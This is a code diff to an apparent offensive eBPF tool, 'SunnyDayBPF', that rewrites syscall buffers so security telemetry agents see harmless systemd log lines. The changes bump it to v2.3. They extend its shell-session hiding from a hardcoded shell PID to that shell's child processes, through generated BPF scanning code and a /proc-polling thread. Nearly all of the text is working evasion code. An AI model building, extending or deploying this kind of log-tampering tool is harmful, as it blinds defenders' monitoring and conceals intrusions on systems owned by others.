@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-SunnyDayBPF v2.2 — Universal Post-Syscall Telemetry Redactor
+SunnyDayBPF v2.3 — Universal Post-Syscall Telemetry Redactor
 Milenium Security Research | Azizcan Dastan
 Post-syscall user-buffer deception across all telemetry pipelines
-v2.2: Shell mode — full session invisibility via benign log injection
+v2.3: Shell mode + child process tracking
 """
 
 from bcc import BPF
@@ -130,6 +130,9 @@ NUM_SHELL_TEMPLATES = 16
 SHELL_REPLACE_SLOT  = 1
 CHAIN_OFFSET        = 2
 EMIT_EVENT_SLOT     = 12
+MAX_CHILD_PIDS      = 4
+CHILD_SCAN_STEP     = 5
+SHELL_SCAN_STEP     = 3
 
 _TEMPLATE_TEXTS = [
     b"systemd[1]: Starting Daily Cleanup of Temporary Directories.",
@@ -271,36 +274,60 @@ BPF_ARRAY(shell_pid_map, u32, {SHELL_PID_MAP_SIZE});
 
 struct template_t {{ char data[{BUF_SIZE}]; }};
 BPF_ARRAY(shell_templates, struct template_t, {NUM_SHELL_TEMPLATES});
+
+struct child_pid_t {{ char data[8]; u8 len; u8 active; }};
+BPF_ARRAY(child_pids, struct child_pid_t, {MAX_CHILD_PIDS});
 """
 
 
 def gen_shell_check(shell_pid):
-    """Generate loop-free shell_check with unrolled position checks for the hardcoded PID."""
+    """Generate loop-free shell_check: hardcoded shell PID + dynamic child PID slots."""
     pid_str = str(shell_pid)
     pid_len = len(pid_str)
     scan_end = SHELL_SCAN_LEN - pid_len
 
-    blocks = []
-    for pos in range(0, scan_end, 2):
+    # --- Shell PID checks (step = SHELL_SCAN_STEP) ---
+    shell_blocks = []
+    for pos in range(0, scan_end, SHELL_SCAN_STEP):
         byte_conds = " && ".join(f"d[{pos}+{j}]=='{pid_str[j]}'" for j in range(pid_len))
         after_idx = pos + pid_len
         conditions = [byte_conds]
-
-        # Digit boundary: before (skip for pos=0, compiler knows pos==0 at compile time)
         if pos > 0:
             conditions.append(f"(d[{pos}-1]<'0' || d[{pos}-1]>'9')")
-
-        # Digit boundary: after
         conditions.append(f"(d[{after_idx}]<'0' || d[{after_idx}]>'9')")
-
         all_conds = " && ".join(conditions)
-        blocks.append(
+        shell_blocks.append(
             f"    if ({all_conds}) {{\n"
             f"        st->shell_hit = 1;\n"
             f"        chain.call(ctx, {SHELL_REPLACE_SLOT});\n"
             f"        return 0;\n"
             f"    }}"
         )
+
+    # --- Child PID checks (step = CHILD_SCAN_STEP, 4 slots) ---
+    child_blocks = []
+    for slot in range(MAX_CHILD_PIDS):
+        slot_var = f"c{slot}"
+        child_blocks.append(f"    // Child PID slot {slot}")
+        child_blocks.append(f"    if ({slot_var} && {slot_var}->active && {slot_var}->len > 0) {{")
+        child_blocks.append(f"        int L{slot} = {slot_var}->len;")
+        cscan_end = SHELL_SCAN_LEN  # bounds checked per-position
+        for pos in range(0, cscan_end, CHILD_SCAN_STEP):
+            byte_conds_list = [f"(d[{pos}+{j}]=={slot_var}->data[{j}] || {slot_var}->data[{j}]==0)" for j in range(8)]
+            byte_conds = " && ".join(byte_conds_list)
+            conditions = [byte_conds]
+            if pos > 0:
+                conditions.append(f"(d[{pos}-1]<'0' || d[{pos}-1]>'9')")
+            conditions.append(f"({pos}+L{slot}>={BUF_SIZE} || d[{pos}+L{slot}]<'0' || d[{pos}+L{slot}]>'9')")
+            all_conds = " && ".join(conditions)
+            child_blocks.append(
+                f"        if ({all_conds}) {{\n"
+                f"            st->shell_hit = 1;\n"
+                f"            chain.call(ctx, {SHELL_REPLACE_SLOT});\n"
+                f"            return 0;\n"
+                f"        }}"
+            )
+        child_blocks.append("    }")
 
     return f"""
 int shell_check(struct pt_regs *ctx) {{
@@ -312,7 +339,18 @@ int shell_check(struct pt_regs *ctx) {{
     if (!data) return 0;
     char *d = data->buf;
 
-{chr(10).join(blocks)}
+    // Cache child PID slots
+    u32 _c0k=0, _c1k=1, _c2k=2, _c3k=3;
+    struct child_pid_t *c0 = child_pids.lookup(&_c0k);
+    struct child_pid_t *c1 = child_pids.lookup(&_c1k);
+    struct child_pid_t *c2 = child_pids.lookup(&_c2k);
+    struct child_pid_t *c3 = child_pids.lookup(&_c3k);
+
+    // Hardcoded shell PID {pid_str} scan
+{chr(10).join(shell_blocks)}
+
+    // Dynamic child PID scans
+{chr(10).join(child_blocks)}
 
     chain.call(ctx, {CHAIN_OFFSET});
     return 0;
@@ -683,7 +721,7 @@ class ShellModeManager:
         return current
 
     def _update_pids_loop(self):
-        """Background thread: poll /proc to refresh tracked PIDs."""
+        """Background thread: poll /proc to refresh tracked PIDs and child BPF slots."""
         while self._running:
             time.sleep(0.5)
             try:
@@ -693,15 +731,45 @@ class ShellModeManager:
                 for pid in (current - self.tracked_pids):
                     self._add_pid(pid)
                 self.tracked_pids = current
+                self._sync_child_pid_slots()
             except Exception:
                 pass
+
+    def _sync_child_pid_slots(self):
+        """Write tracked child PIDs into the BPF child_pids array for scanning."""
+        try:
+            child_map = self.bpf.get_table("child_pids")
+            children = sorted([p for p in self.tracked_pids if p != self.shell_pid])
+            for i in range(MAX_CHILD_PIDS):
+                idx = ctypes.c_int(i)
+                leaf = child_map.Leaf()
+                if i < len(children):
+                    pid = children[i]
+                    pid_bytes = str(pid).encode()
+                    plen = min(len(pid_bytes), 7)
+                    # Copy PID bytes into leaf.data (char[8])
+                    for j in range(8):
+                        if j < plen:
+                            leaf.data[j] = pid_bytes[j]
+                        else:
+                            leaf.data[j] = 0
+                    leaf.len = plen
+                    leaf.active = 1
+                else:
+                    for j in range(8):
+                        leaf.data[j] = 0
+                    leaf.len = 0
+                    leaf.active = 0
+                child_map[idx] = leaf
+        except Exception:
+            pass
 
 def print_banner():
     print(f"""
 {B}{C}+=====================================================================+
-|  SunnyDayBPF v2.2 -- Universal Post-Syscall Telemetry Redactor      |
+|  SunnyDayBPF v2.3 -- Universal Post-Syscall Telemetry Redactor      |
 |  Milenium Security Research | Azizcan Dastan                        |
-|  v2.2: Shell mode -- full session invisibility                      |
+|  v2.3: Shell mode + child process tracking                          |
 +====================================================================={RST}
 """)
 
@@ -767,7 +835,7 @@ def print_stats():
 
 
 def main():
-    parser = argparse.ArgumentParser(description="SunnyDayBPF v2.2 -- Universal Telemetry Redactor")
+    parser = argparse.ArgumentParser(description="SunnyDayBPF v2.3 -- Universal Telemetry Redactor")
     parser.add_argument("--dump-bpf", action="store_true", help="BPF C kodunu yazdir ve cik")
     parser.add_argument("--list-rules", action="store_true", help="Tum kurallari listele")
     parser.add_argument("--list-agents", action="store_true", help="Hedef agentlari listele")
